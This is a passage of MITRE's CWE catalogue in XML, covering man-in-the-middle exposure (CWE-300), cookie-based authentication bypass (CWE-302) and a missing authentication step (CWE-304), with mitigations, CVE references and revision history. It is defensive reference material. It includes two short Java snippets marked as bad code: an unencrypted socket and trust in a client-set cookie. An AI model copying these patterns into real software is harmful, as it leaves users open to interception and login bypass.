               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Observed_Examples, References, Relationships, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-01-16</Modification_Date>
               <Modification_Comment>Integrated mitigations and detection methods for Certificate Pinning based on feedback from the CWE Researcher List in December 2017.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Detection_Factors, Modes_of_Introduction, Potential_Mitigations, References, Time_of_Introduction</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Detection_Factors, Modes_of_Introduction</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-03-10">Failure to Validate Host-specific Certificate Data</Previous_Entry_Name>
            <Previous_Entry_Name Date="2013-02-21">Improper Validation of Host-specific Certificate Data</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="300" Name="Channel Accessible by Non-Endpoint" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not adequately verify the identity of actors at both ends of a communication channel, or does not adequately ensure the integrity of the channel, in a way that allows the channel to be accessed or influenced by an actor that is not an endpoint.</Description>
         <Extended_Description>In order to establish secure communication between two parties, it is often important to adequately verify the identity of entities at each end of the communication channel. Inadequate or inconsistent verification may result in insufficient or incorrect identification of either communicating entity. This can have negative consequences such as misplaced trust in the entity at the other end of the channel. An attacker can leverage this by interposing between the communicating entities and masquerading as the original entity. In the absence of sufficient verification of identity, such an attacker can eavesdrop and potentially modify the communication between the original entities.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="923" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Adversary-in-the-Middle / AITM</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Man-in-the-Middle / MITM</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Person-in-the-Middle / PITM</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Monkey-in-the-Middle</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Monster-in-the-Middle</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>On-path attack</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Interception attack</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Access Control</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could pose as one of the entities and read or possibly modify the communication.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Always fully authenticate both ends of any communications channel.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Adhere to the principle of complete mediation.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>A certificate binds an identity to a cryptographic key to authenticate a communicating party. Often, the certificate takes the encrypted form of the hash of the identity of the subject, the public key, and information such as time of issue or expiration using the issuer's private key. The certificate can be validated by deciphering the certificate with the issuer's public key. See also X.509 certificate signature chains and the PGP certification structure.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the Java snippet below, data is sent over an unencrypted channel to a remote server.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Socket sock;<xhtml:br/>PrintWriter out;<xhtml:br/>
                     <xhtml:br/>try {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>sock = new Socket(REMOTE_HOST, REMOTE_PORT);<xhtml:br/>out = new PrintWriter(echoSocket.getOutputStream(), true);<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// Write data to remote host via socket output stream.</xhtml:i>
                           <xhtml:br/>...</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>By eavesdropping on the communication channel or posing as the endpoint, an attacker would be able to read all of the transmitted data.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2014-1266</Reference>
               <Description>chain: incorrect "goto" in Apple SSL product bypasses certificate validation, allowing Adversry-in-the-Middle (AITM) attack (Apple "goto fail" bug). CWE-705 (Incorrect Control Flow Scoping) -&gt; CWE-561 (Dead Code) -&gt; CWE-295 (Improper Certificate Validation) -&gt; CWE-393 (Return of Wrong Status Code) -&gt; CWE-300 (Channel Accessible by Non-Endpoint).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-1266</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Man-in-the-middle (MITM)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>32</Entry_ID>
               <Entry_Name>Routing Detour</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC06-J</Entry_ID>
               <Entry_Name>Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="466"/>
            <Related_Attack_Pattern CAPEC_ID="57"/>
            <Related_Attack_Pattern CAPEC_ID="589"/>
            <Related_Attack_Pattern CAPEC_ID="590"/>
            <Related_Attack_Pattern CAPEC_ID="612"/>
            <Related_Attack_Pattern CAPEC_ID="613"/>
            <Related_Attack_Pattern CAPEC_ID="615"/>
            <Related_Attack_Pattern CAPEC_ID="662"/>
            <Related_Attack_Pattern CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-244"/>
         </References>
         <Notes>
            <Note Type="Maintenance">The summary identifies multiple distinct possibilities, suggesting that this is a category that must be broken into more specific weaknesses.</Note>
            <Note Type="Mapping">
               <xhtml:p>Use for Mapping: Discouraged (this CWE ID should not be used to map to real-world vulnerabilities).</xhtml:p>
               <xhtml:p>Rationale: CWE-300 is commonly misused for vulnerabilities in which the prerequisites for exploitation require the adversary to be in a privileged "in-the-middle" position.</xhtml:p>
               <xhtml:p>Comments: Consider root-cause weaknesses that allow adversary-in-the-middle attacks to happen.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Maintenance_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Name, Observed_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Man-in-the-middle (MITM)</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Channel Accessible by Non-Endpoint (aka 'Man-in-the-Middle')</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Channel Accessible by Non-Endpoint ('Man-in-the-Middle')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="302" Name="Authentication Bypass by Assumed-Immutable Data" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The authentication scheme or implementation uses key data elements that are assumed to be immutable, but can be controlled or modified by the attacker.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1390" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="807" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Description>Implement proper protection for immutable data (e.g. environment variable, hidden form fields, etc.)</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following example, an "authenticated" cookie is used to determine whether or not a user should be granted access to a system.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>boolean authenticated = new Boolean(getCookieValue("authenticated")).booleanValue();<xhtml:br/>if (authenticated) {<xhtml:div style="margin-left:1em;">...</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Modifying the value of a cookie on the client-side is trivial, but many developers assume that cookies are essentially immutable.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-0367</Reference>
               <Description>DebPloit</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0367</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0261</Reference>
               <Description>Web auth</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0261</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1730</Reference>
               <Description>Authentication bypass by setting certain cookies to "true".</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1730</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1734</Reference>
               <Description>Authentication bypass by setting certain cookies to "true".</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1734</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-2064</Reference>
               <Description>Admin access by setting a cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-2064</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-2054</Reference>
               <Description>Gain privileges by setting cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-2054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1611</Reference>
               <Description>Product trusts authentication information in cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1611</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1708</Reference>
               <Description>Authentication bypass by setting admin-testing variable to true.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1708</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1787</Reference>
               <Description>Bypass auth and gain privileges by setting a variable.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1787</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Authentication Bypass via Assumed-Immutable Data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC02-J</Entry_ID>
               <Entry_Name>Do not base security checks on untrusted sources</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="10"/>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="274"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
            <Related_Attack_Pattern CAPEC_ID="45"/>
            <Related_Attack_Pattern CAPEC_ID="77"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="304" Name="Missing Critical Step in Authentication" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product implements an authentication technique, but it skips a step that weakens the technique.</Description>
         <Extended_Description>Authentication techniques should follow the algorithms that define them exactly, otherwise authentication can be bypassed or more easily subjected to brute force attacks.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="303" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="573" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or allowing attackers to execute arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-2163</Reference>
               <Description>Shared secret not verified in a RADIUS response packet, allowing authentication bypass by spoofing server replies.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2163</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Missing Critical Step in Authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
